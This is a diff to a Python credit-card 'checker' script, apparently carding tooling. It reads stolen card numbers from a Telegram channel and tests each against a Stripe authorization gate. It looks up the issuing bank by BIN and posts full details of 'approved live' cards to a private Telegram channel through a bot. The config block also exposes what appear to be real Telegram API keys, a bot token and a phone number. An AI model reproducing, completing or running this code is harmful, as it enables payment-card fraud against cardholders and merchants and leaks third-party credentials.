@@ -6,11 +6,11 @@ from datetime import datetime
 
 # ==== CONFIG ====
 api_id = 29569239  # Your Telegram api_id (integer)
-api_hash = 'b2407514e15f24c8ec2c735e8018acd7'
-phone_number = '+254780855836'
-bot_token = '8065916669:AAHLmc9TMnZb7QHv2B7pEYB3O7cKuk0HrUA'
-source_channel = '@vjjgjjjnv'  # Channel/group to listen to
-private_channel_id = -1002336223485  # ID of the channel to drop approvals
+api_hash = 'b2407514e15f24c8ec2c735e8018acd7'  # Your Telegram api_hash
+phone_number = '+254780855836'  # Your Telegram phone number (with country code)
+bot_token = '8065916669:AAHLmc9TMnZb7QHv2B7pEYB3O7cKuk0HrUA'  # Your Telegram bot token (from BotFather)
+source_channel = '@vjjgjjjnv'  # Username or ID of the channel/group to listen to (MUST BE JOINED)
+private_channel_id = -1002336223485  # ID of the channel to drop approvals (bot must be admin here)
 
 kk = "qwertyuiolmkjnhbgvfcdxszaQWEAERSTSGGZJDNFMXLXLVKPHPY1910273635519"
 print(render('M.SALAH', colors=['white', 'white'], align='center'))
@@ -25,11 +25,12 @@ def country_flag_emoji(country_code):
     return chr(0x1F1E6 + ord(country_code.upper()[0]) - ord('A')) + chr(0x1F1E6 + ord(country_code.upper()[1]) - ord('A'))
 
 def bin_lookup(bin_number):
-    # Try bins.antipublic.cc first
+    # 1. Try bins.antipublic.cc first
     try:
         resp = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
         if resp.status_code == 200 and "Not Found" not in resp.text and resp.text.strip() != "":
             data = resp.json()
+            # Format: {"bin":"531258","brand":"MASTERCARD","type":"CREDIT","level":"STANDARD","bank":"BANCO DO BRASIL S.A.","country":"BR","country_name":"BRAZIL"}
             return {
                 "bank": data.get("bank", "Unknown"),
                 "country_name": data.get("country_name", "Unknown"),
@@ -40,7 +41,7 @@ def bin_lookup(bin_number):
     except Exception as e:
         print("[Antipublic BIN lookup failed]", e)
 
-    # Fallback to lookup.binlist.net
+    # 2. Fallback to lookup.binlist.net
     try:
         resp = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
         if resp.status_code == 200:
@@ -61,11 +62,12 @@ def bin_lookup(bin_number):
     except Exception as e:
         print("[Binlist.net BIN lookup failed]", e)
 
+    # Default fallback
     return {
         "bank": "Unknown", "country_name": "Unknown", "country_flag": "🌍", "brand": "Unknown", "type": "Unknown"
     }
 
-def format_approved_drop_code(cc_data, bininfo, response="Payment method successfully added ✅"):
+def format_approved_drop(cc_data, bininfo, response="Payment method successfully added ✅"):
     card, month, year, cvv = cc_data.split('|')
     bin_number = card[:6]
     bank = bininfo.get('bank', 'Unknown')
@@ -76,19 +78,19 @@ def format_approved_drop_code(cc_data, bininfo, response="Payment method success
     time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     message = (
-        "<b>Approved Live Stripe Auth ✅</b>\n"
-        "<code>────────────────────────────</code>\n"
-        f"<code>💳 CC: {cc_data}</code>\n"
-        f"<code>🔐 GATE: Stripe Auth</code>\n"
-        f"<code>🟢 RESPONSE: {response}</code>\n"
-        "<code>────────────────────────────</code>\n"
-        f"<code>🆔 BIN: {bin_number}</code>\n"
-        f"<code>🏦 Bank: {bank}</code>\n"
-        f"<code>🌍 Country: {flag} {country}</code>\n"
-        f"<code>💠 Type: {ctype} - {brand}</code>\n"
-        "<code>────────────────────────────</code>\n"
-        f"<code>🕒 Time: {time_str}</code>\n"
-        "<code>[~] Dev: BUNNY - 👑</code>"
+        f"<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗟𝗶𝘃𝗲 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ✅</b>\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━</b>\n"
+        f"<b>💳 𝗖𝗖:</b> <code>{cc_data}</code>\n"
+        f"<b>🔐 𝗚𝗔𝗧𝗘:</b> <code>Stripe Auth</code>\n"
+        f"<b>🟢 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> <b>{response}</code>\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━</b>\n"
+        f"<b>🆔 𝗕𝗜𝗡:</b> <code>{bin_number}</code>\n"
+        f"<b>🏦 𝗕𝗮𝗻𝗸:</b> <code>{bank}</code>\n"
+        f"<b>🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {flag} <code>{country}</code>\n"
+        f"<b>💠 𝗧𝘆𝗽𝗲:</b> <code>{ctype} - {brand}</code>\n"
+        f"<b>━━━━━━━━━━━━━━━━━━━</b>\n"
+        f"<b>🕒 𝗧𝗶𝗺𝗲:</b> <code>{time_str}</code>\n"
+        f"<b>[⌥] 𝗗𝗲𝘃:</b> <a href='https://t.me/bunny2050'>BUNNY - 👑</a>"
     )
     return message
 
@@ -211,7 +213,7 @@ def chk(ccx, ID, token):
     bininfo = bin_lookup(ccx.split("|")[0][:6])
     if "succeeded" in resp.text:
         msg = Fore.GREEN + "Payment method successfully added. ✅"
-        text = format_approved_drop_code(ccx, bininfo, response="Payment method successfully added ✅")
+        text = format_approved_drop(ccx, bininfo, response="Payment method successfully added ✅")
         requests.post(
             f"https://api.telegram.org/bot{token}/sendMessage",
             data={
@@ -222,7 +224,7 @@ def chk(ccx, ID, token):
             },
         )
     elif "insufficient funds" in resp.text:
-        text = format_approved_drop_code(ccx, bininfo, response="insufficient funds.. ✅")
+        text = format_approved_drop(ccx, bininfo, response="insufficient funds.. ✅")
         requests.post(
             f"https://api.telegram.org/bot{token}/sendMessage",
             data={
